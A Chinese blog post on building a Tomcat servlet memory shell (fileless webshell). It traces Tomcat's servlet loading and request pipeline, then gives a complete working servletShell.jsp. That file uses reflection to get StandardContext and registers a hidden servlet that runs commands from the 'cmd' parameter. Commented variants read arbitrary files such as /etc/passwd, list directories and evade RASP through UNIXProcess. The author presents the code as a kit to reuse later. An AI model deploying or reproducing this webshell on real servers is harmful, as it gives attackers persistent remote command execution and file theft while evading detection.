---
title: "servlet内存马re"
onlyTitle: true
date: 2025-2-25 14:23:33
categories:
- java
- 内存马
tags:
- 内存马
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8131.jpg

---



新开一个内存马的坑，虽然之前学了，但是很散，而且code没做集成。现在总的复习一遍，把code归到一个项目方便后续利用

内存马的概念就不提了

# servlet内存马

## 环境搭建

先搭一个java web的环境（先用Tomcat8.5.x，如下：）

https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.61/

![image-20250219162707344](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250219162707344.png)

![image-20250219162815516](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250219162815516.png)

来个tomcat-catalina方便调试

```xml
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.61</version>
</dependency>
```

看到HelloServlet有个@WebServlet的注解，这其实是自动完成了把类注入进/hello-servlet的web映射

![image-20250219163428214](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250219163428214.png)

效果等同于在WEB-INF/web.xml下写入以下代码，以xml形式注入

```xml
<servlet>
    <servlet-name>HelloServlet</servlet-name>
    <servlet-class>org.example.tomcatmemshell.HelloServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>HelloServlet</servlet-name>
    <url-pattern>/hello-servlet</url-pattern>
</servlet-mapping>
```

![image-20250219165958584](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250219165958584.png)

Tomcat控制台乱码：编辑自定义虚拟机选项，添加`-Dfile.encoding=UTF-8`

![image-20250219172057822](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250219172057822.png)

![image-20250219172123255](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250219172123255.png)

Tomcat虚拟机选项也加上`-Dfile.encoding=UTF-8`

![image-20250219172154253](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250219172154253.png)



## servlet

servlet是一个Java应用程序，运行在服务器端，用来处理客户端请求并作出响应的程序。servlet没有main方法不能独立运行，需要使用servlet容器比如tomcat来创建。当我们通过URL来访问servlet，首先会在servlet容器中判断该URL是由哪个servlet处理的，当前容器中是否有这个servlet实例，如果没有则创建servlet实例，并交由对应servlet的service方法来处理请求，处理结束后再返回web服务器。

![image-20201231105141162](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20201231105141162.png)

Servlet分别有以下几个方法：

```java
public interface Servlet {
    void init(ServletConfig var1) throws ServletException; // init方法，创建好实例后会被立即调用，仅调用一次。

    ServletConfig getServletConfig();//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数

    void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException;  //每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。

    String getServletInfo();//返回有关servlet的信息，如作者、版本和版权.

    void destroy();//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源
}
```

在servlet生命周期中，service是处理请求的主方法，作为其实现类，HttpServlet在service方法中，根据不同类型调用了不同的doxxx方法去处理

![image-20250220105518945](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220105518945.png)

而且Web应用程序的调用顺序是Listener -> Filter -> Servlet，Servlet马是最后触发的

### web.xml加载

先把断点打在org.apache.catalina.startup.ContextConfig#webConfig方法，在该方法内完成了web.xml的加载

先是新建了一个webXmlParser，然后调用getContextWebXmlSource获取了本地web.xml的地址

![image-20250225132302190](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225132302190.png)

![image-20250225132401601](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225132401601.png)

其他的代码都是一些初始化和合并web.xml和fragments.xml的代码，具体的应用xml锁定到configureContext()

![image-20250225132711776](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225132711776.png)

在大概1280行的样子，是对web.xml中的servlet进行循环解析。

![image-20250225132855796](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225132855796.png)

介绍一下这个for循环的核心内容：

1. 调用context.createWrapper新建StandardWrapper，这里的context是StandardContext

![image-20250225133521318](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225133521318.png)

2. 接着调用getLoadOnStartup，判断是否自定义懒加载模式，如果开启则设置wrapper为相应的模式

![image-20250225133606416](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225133606416.png)

3. setName设置ServletName

![image-20250225134109978](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225134109978.png)

4. setServletClass设置servlet的全限定名

![image-20250225134652763](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225134652763.png)

以上的set从servlet变量值就能看出，最简单的servlet其实只有两个值需要设置，servletName，servletClass，连loadOnStartup都不用设置。所以理论上我们手动创建servlet也只需要调用setName和setServletClass即可组装一个StandardWrapper以供使用

![image-20250225134816274](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225134816274.png)

5. 最后调用了context.addChild，把配置好的StandardWrapper向context里装填

![image-20250225135012174](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225135012174.png)

跟进到StanardContext.addChild，调用了父类ContainerBase的addChild

![image-20250225135126717](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225135126717.png)

继续跟进，调用了addChildInternal

![image-20250225135204221](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225135204221.png)

继续跟进，调用了child.start启动了这个子wrapper

![image-20250225135242177](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225135242177.png)

在上一个for循环后面的一个for，遍历了所有的servletMappings，调用addServletMappingDecoded，根据参数一看就是添加URL映射

![image-20250225140021944](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225140021944.png)

除此之外还有一个StandardWrapper的方法需要调用，是setServlet，这个方法是在实例化后调用的，现在初始化暂时调不出来

![image-20250225144616007](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225144616007.png)

现在知道了向context添加自定义servlet的过程了：

```java
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);//可省略
    wrapper.setName(name);
	wrapper.setServlet(new ServletShell())
    wrapper.setServletClass(servletShell.getClass().getName());
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell",name);
```

那怎样获取standardContext？



### jsp获取standardContext

jsp里自带了对象request，且是tomcat catalina自带的org.apache.catalina.connector.RequestFacade，该类自带了getServletContext方法

![image-20250225143027069](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225143027069.png)

随便写个jsp调用该方法，并打上断点访问

![image-20250225142615492](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225142615492.png)

可以看到getServletContext取到的是ApplicationContextFacade，下面有个context变量是ApplicationContext，再进一层的context变量是StandardContext

![image-20250225143204852](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225143204852.png)

我们可以通过两层反射取到StandardContext，而且每个 StandardContext 实例代表一个独立的Web应用程序，在一个web应用程序中，共用一个StandardContext

所以在jsp中取StandardContext如下：

```java
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) request.getServletContext();
    Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextFacadeField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
```

网上流传的request.getSession().getServletContext()其实结果和request.getServletContext结果一样

![image-20250225153034417](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225153034417.png)



### java获取standardContext

如果现在有一个反序列化执行java代码的入口，需要以java方式获取StandardContext，加上java并没有内置request对象。获取就会比较麻烦一些。而且JSP肯定可以用java的获取request的方法，所以不止这些获取StandardContext的方法，另开一文细说

### servlet实例化

OK，现在根据下图，请求到达Server上的Tomcat service，是先交由connector连接器处理，断点打在Http11Protocol.service()上

![tomcat3](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoratomcat3.png)

前面的代码都是一些解析HTTP请求并赋值的操作，看到调用了getAdapter().service()

![image-20250220111044039](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220111044039.png)

显然这里getAdapter()取到的就是CoyoteAdapter

![image-20250220111231430](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220111231430.png)

跟进到CoyoteAdapter.service()，先是从org.apache.coyoye.Request封装中取出普通Request；Response同理

![image-20250220112421730](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220112421730.png)

接着调用如下代码

```java
connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);
```

![image-20250220112624600](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220112624600.png)

其中getContatianer是返回engine，这一步就对应了上图connector转交给Engine处理的过程

![image-20250220113532562](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220113532562.png)

connector.getService()返回StandardService

StandardService.getContainer()返回StandardEngine

StandardEngine.getPipeline()返回StandardPipeline

StandardPipeline.getFirst()返回StandardEngineValve

于是跟进到了StandardEngineValve.invoke，此时为上图的Engine模块中。通过Request.getHost()获取了主机名，然后调用host.getPipeline().getFirst().invoke

![image-20250220114310795](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220114310795.png)

很显然，举一反三，这里的host为StandardHost，连跟几个invoke，跟进到StandardHostValve.invoke

![image-20250220212740524](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220212740524.png)

下一步就是从host中获取context了，从代码也可以看出调用了request.getContext()，得到StandardContext，接着调用了getPipeline().getFirst().invoke，

![image-20250220213015287](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220213015287.png)

中间的身份验证的东西先省略，大致可以看出是验证session的，来到AuthenticatorBase的getNext.invoke

![image-20250220213148768](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220213148768.png)

跟进到StandardContextValue.invoke

![image-20250220213317303](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220213317303.png)

然后是取Wrapper

![image-20250220214748878](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220214748878.png)

![image-20250220214816230](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220214816230.png)

OK现在跟进到了StandardWrapperValve.invoke，在该方法内，先是调用wrapper.allocate()

![image-20250225130453564](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225130453564.png)

allocate()内，如果满足if条件，会调用loadServlet，虽然这里不会进入这个if，但是可以提前看一下loadServlet的内容

![image-20250225130515447](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225130515447.png)

调用了instanceManger.newInstance，显然是实例化servlet类，前面在webConfig把servlet从web.xml加载到了StandardContext，但是因为Tomcat懒加载，并没有立即进行实例化

>Tomcat具有懒加载的功能，启动Tomcat时，不会实例化servlet，等第一次访问servlet url时，才会调用`org.apache.catalina.core.DefaultInstanceManager#newInstance(java.lang.String)`进行实例化

![image-20250225130617354](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250225130617354.png)

回到StandardWrapperValve.invoke

调用了ApplicationFilterFactory.createFilterChain()去创建一个Filter链，然后在if块内，如果是异步分派就是调用doInternalDispatch，如果不是就直接调用filterChain.doFilter。这段在之后分析Filter内存马的时候还会见到

![image-20250220215002701](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220215002701.png)

这段不用自己去手动调用



现在假设有运行jsp代码的场景，写一个jsp的servlet内存马

## 内存马构造

首先写一个正常的servlet类，直接copy HelloServlet即可

然后是修改其生命周期内能用的方法，servlet init->doGet->destroy，修改doGet为执行命令

给一个上次复现MRCTF的shell，有列目录、读文件、RCE、JNI绕过RASP版RCE四个功能，详情看中字使用

```java
            System.out.println(
                    "TomcatShellInject doFilter.....................................................................");
            String cmdParamName = "cmd";
            String cmd;
            if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP，详情搜索JNI
//            Class<?> cls = null;
//            try {
//                cls = Class.forName("java.lang.UNIXProcess");
//            } catch (ClassNotFoundException e) {
//                throw new RuntimeException(e);
//            }
//            Constructor<?> constructor = cls.getDeclaredConstructors()[0];
//            constructor.setAccessible(true);
//            String[] command = {"/bin/sh", "-c", cmd};
//            byte[] prog = toCString(command[0]);
//            byte[] argBlock = getArgBlock(command);
//            int argc = argBlock.length;
//            int[] fds = {-1, -1, -1};
//            Object obj = null;
//            try {
//                obj = constructor.newInstance(prog, argBlock, argc, null, 0, null, fds, false);
//                Method method = cls.getDeclaredMethod("getInputStream");
//                method.setAccessible(true);
//                InputStream is = (InputStream) method.invoke(obj);
//                InputStreamReader isr = new InputStreamReader(is);
//                BufferedReader br = new BufferedReader(isr);
//                StringBuilder stringBuilder = new StringBuilder();
//                String line;
//                while ((line = br.readLine()) != null) {
//                    stringBuilder.append(line + '\n');
//                }
//                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            } catch (InstantiationException | NoSuchMethodException | InvocationTargetException |
//                     IllegalAccessException e) {
//                throw new RuntimeException(e);
//            }
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

////读文件
//            File file = new File(cmd);
//            // 1. 确保文件存在且可读
//            if (!file.exists() || !file.isFile() || !file.canRead()) {
//                System.out.println("文件不存在或无法读取: " + cmd);
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_NOT_FOUND, "文件不存在");
//                return;
//            }
//            // 2. 设置响应头，提供文件下载
//            HttpServletResponse response = (HttpServletResponse) servletResponse;
//            response.setContentType("application/octet-stream");
//            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
//            // 3. 读取文件并写入响应流
//            try (FileInputStream fis = new FileInputStream(file);
//                 OutputStream out = response.getOutputStream()) {
//                byte[] buffer = new byte[4096];
//                int bytesRead;
//                while ((bytesRead = fis.read(buffer)) != -1) {
//                    out.write(buffer, 0, bytesRead);
//                }
//                out.flush();
//            } catch (IOException e) {
//                System.err.println("文件传输失败: " + e.getMessage());
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "文件传输失败");
//            }

////读纯文本 ?cmd=file:///etc/passwd or 列目录 ?cmd=file:///
//            final URL url = new URL(cmd);
//            final BufferedReader in = new BufferedReader(new
//                    InputStreamReader(url.openStream()));
//            StringBuilder stringBuilder = new StringBuilder();
//            String line;
//            while ((line = in.readLine()) != null) {
//                stringBuilder.append(line + '\n');
//            }
//            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

//RCE ?cmd=whoami
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
                return;
            }

//辅助函数
		byte[] toCString(String s) {
        if (s == null) {
            return null;
        }
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }
    private static byte[] getArgBlock(String[] cmdarray){
        byte[][] args = new byte[cmdarray.length-1][];
        int size = args.length;
        for (int i = 0; i < args.length; i++) {
            args[i] = cmdarray[i+1].getBytes();
            size += args[i].length;
        }
        byte[] argBlock = new byte[size];
        int i = 0;
        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
        }
        return argBlock;
    }
```

插入到doGet里即可，jsp用`<%! %>`声明类

```java
<%!
    public class ServletMemShell extends HttpServlet {
        private String message;

        public void init() {
            message = "Hello World!";
        }

        public void doGet(HttpServletRequest servletRequest, HttpServletResponse servletResponse) throws IOException {
            System.out.println(
                    "TomcatShellInject doFilter.....................................................................");
            String cmdParamName = "cmd";
            String cmd;
            if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP，详情搜索JNI
//            Class<?> cls = null;
//            try {
//                cls = Class.forName("java.lang.UNIXProcess");
//            } catch (ClassNotFoundException e) {
//                throw new RuntimeException(e);
//            }
//            Constructor<?> constructor = cls.getDeclaredConstructors()[0];
//            constructor.setAccessible(true);
//            String[] command = {"/bin/sh", "-c", cmd};
//            byte[] prog = toCString(command[0]);
//            byte[] argBlock = getArgBlock(command);
//            int argc = argBlock.length;
//            int[] fds = {-1, -1, -1};
//            Object obj = null;
//            try {
//                obj = constructor.newInstance(prog, argBlock, argc, null, 0, null, fds, false);
//                Method method = cls.getDeclaredMethod("getInputStream");
//                method.setAccessible(true);
//                InputStream is = (InputStream) method.invoke(obj);
//                InputStreamReader isr = new InputStreamReader(is);
//                BufferedReader br = new BufferedReader(isr);
//                StringBuilder stringBuilder = new StringBuilder();
//                String line;
//                while ((line = br.readLine()) != null) {
//                    stringBuilder.append(line + '\n');
//                }
//                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            } catch (InstantiationException | NoSuchMethodException | InvocationTargetException |
//                     IllegalAccessException e) {
//                throw new RuntimeException(e);
//            }
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

////读文件
//            File file = new File(cmd);
//            // 1. 确保文件存在且可读
//            if (!file.exists() || !file.isFile() || !file.canRead()) {
//                System.out.println("文件不存在或无法读取: " + cmd);
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_NOT_FOUND, "文件不存在");
//                return;
//            }
//            // 2. 设置响应头，提供文件下载
//            HttpServletResponse response = (HttpServletResponse) servletResponse;
//            response.setContentType("application/octet-stream");
//            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
//            // 3. 读取文件并写入响应流
//            try (FileInputStream fis = new FileInputStream(file);
//                 OutputStream out = response.getOutputStream()) {
//                byte[] buffer = new byte[4096];
//                int bytesRead;
//                while ((bytesRead = fis.read(buffer)) != -1) {
//                    out.write(buffer, 0, bytesRead);
//                }
//                out.flush();
//            } catch (IOException e) {
//                System.err.println("文件传输失败: " + e.getMessage());
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "文件传输失败");
//            }

////读文件 ?cmd=file:///etc/passwd or 列目录 ?cmd=file:///
//            final URL url = new URL(cmd);
//            final BufferedReader in = new BufferedReader(new
//                    InputStreamReader(url.openStream()));
//            StringBuilder stringBuilder = new StringBuilder();
//            String line;
//            while ((line = in.readLine()) != null) {
//                stringBuilder.append(line + '\n');
//            }
//            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

//RCE ?cmd=whoami
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
                return;
            }
        }

        public void destroy() {
        }
    }
%>
```

完整servletShell.jsp:

```jsp
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %><%--
  Created by IntelliJ IDEA.
  User: 19583
  Date: 2025/2/19
  Time: 下午5:03
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%!
    public class ServletMemShell extends HttpServlet {
        private String message;

        public void init() {
            message = "Hello World!";
        }

        public void doGet(HttpServletRequest servletRequest, HttpServletResponse servletResponse) throws IOException {
            System.out.println(
                    "TomcatShellInject doFilter.....................................................................");
            String cmdParamName = "cmd";
            String cmd;
            if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP，详情搜索JNI
//            Class<?> cls = null;
//            try {
//                cls = Class.forName("java.lang.UNIXProcess");
//            } catch (ClassNotFoundException e) {
//                throw new RuntimeException(e);
//            }
//            Constructor<?> constructor = cls.getDeclaredConstructors()[0];
//            constructor.setAccessible(true);
//            String[] command = {"/bin/sh", "-c", cmd};
//            byte[] prog = toCString(command[0]);
//            byte[] argBlock = getArgBlock(command);
//            int argc = argBlock.length;
//            int[] fds = {-1, -1, -1};
//            Object obj = null;
//            try {
//                obj = constructor.newInstance(prog, argBlock, argc, null, 0, null, fds, false);
//                Method method = cls.getDeclaredMethod("getInputStream");
//                method.setAccessible(true);
//                InputStream is = (InputStream) method.invoke(obj);
//                InputStreamReader isr = new InputStreamReader(is);
//                BufferedReader br = new BufferedReader(isr);
//                StringBuilder stringBuilder = new StringBuilder();
//                String line;
//                while ((line = br.readLine()) != null) {
//                    stringBuilder.append(line + '\n');
//                }
//                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            } catch (InstantiationException | NoSuchMethodException | InvocationTargetException |
//                     IllegalAccessException e) {
//                throw new RuntimeException(e);
//            }
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

////读文件
//            File file = new File(cmd);
//            // 1. 确保文件存在且可读
//            if (!file.exists() || !file.isFile() || !file.canRead()) {
//                System.out.println("文件不存在或无法读取: " + cmd);
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_NOT_FOUND, "文件不存在");
//                return;
//            }
//            // 2. 设置响应头，提供文件下载
//            HttpServletResponse response = (HttpServletResponse) servletResponse;
//            response.setContentType("application/octet-stream");
//            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
//            // 3. 读取文件并写入响应流
//            try (FileInputStream fis = new FileInputStream(file);
//                 OutputStream out = response.getOutputStream()) {
//                byte[] buffer = new byte[4096];
//                int bytesRead;
//                while ((bytesRead = fis.read(buffer)) != -1) {
//                    out.write(buffer, 0, bytesRead);
//                }
//                out.flush();
//            } catch (IOException e) {
//                System.err.println("文件传输失败: " + e.getMessage());
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "文件传输失败");
//            }

////读文件 ?cmd=file:///etc/passwd or 列目录 ?cmd=file:///
//            final URL url = new URL(cmd);
//            final BufferedReader in = new BufferedReader(new
//                    InputStreamReader(url.openStream()));
//            StringBuilder stringBuilder = new StringBuilder();
//            String line;
//            while ((line = in.readLine()) != null) {
//                stringBuilder.append(line + '\n');
//            }
//            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

//RCE ?cmd=whoami
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
                return;
            }
        }

        public void destroy() {
        }
    }
%>

<%
    //获取StandardContext
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) request.getServletContext();
    Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextFacadeField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    //自定义StandardWrapper注册进StandardContext
    ServletMemShell servletMemShell = new ServletMemShell();
    StandardWrapper standardWrapper = (StandardWrapper) standardContext.createWrapper();
    standardWrapper.setName("servletMemShell");
    standardWrapper.setServletClass(servletMemShell.getClass().getName());
    standardWrapper.setServlet(servletMemShell);
    standardContext.addChild(standardWrapper);
    standardContext.addServletMappingDecoded("/servletMemShell", "servletMemShell");

%>

</body>
</html>

```

![servlet JSP内存马](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraservlet%20JSP%E5%86%85%E5%AD%98%E9%A9%AC.gif)





http://wjlshare.com/archives/1541

https://halfblue.github.io/2020/04/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/